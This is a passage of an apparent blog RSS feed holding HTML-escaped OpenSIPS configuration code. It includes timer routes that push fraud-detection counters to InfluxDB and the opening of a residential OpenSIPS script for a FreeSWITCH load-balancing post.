&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cpm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cpm&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;critcpm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccpm&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(cpm) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ccpm)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_fraud_cdur, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cdur&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccdur&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cdur&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cdur&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcdur&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccdur&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cdur&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcdur&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cdur&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cdur&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;critcdur&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccdur&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(cdur) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ccdur)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_fraud_tc, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_tc&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_crittc&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_tc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_crittc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;tc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;crittc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ctc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(tc) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ctc)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_fraud_cc, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cc&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcc&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;critcc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccc&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(cc) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ccc)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_fraud_seq, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;seq&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cseq&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_seq&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;seq&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critseq&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cseq&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_seq&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critseq&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;seq&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;seq&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;store_influxdb, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_demo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;critseq&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;serverA&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cseq&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX stats: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(seq) / &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(cseq)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>cluecon-fslb</title>
      <link>https://wdd.js.org/opensips/ch8/fs-loadbalance/</link>
      <pubDate>Tue, 02 Jul 2019 22:34:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/fs-loadbalance/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;memdump&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes
